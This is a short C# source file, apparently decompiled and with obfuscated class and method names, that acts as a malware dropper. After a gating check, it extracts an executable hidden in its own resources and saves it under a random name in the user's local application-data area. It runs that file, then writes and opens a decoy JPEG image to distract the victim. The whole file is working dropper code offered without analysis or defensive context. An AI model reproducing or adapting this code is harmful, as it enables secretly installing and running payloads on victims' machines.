using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using ns2;

namespace ns0;

internal static class Class0
{
	private static void Main()
	{
		if (!Class28.smethod_3())
		{
			return;
		}
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "_MsWTkyhvB.exe", (byte[])resourceManager.GetObject("TBlwmMLBIj"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "_MsWTkyhvB.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "goYj_VHOCk.jpg", (byte[])resourceManager.GetObject("UMiUHbLCdL"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "goYj_VHOCk.jpg");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
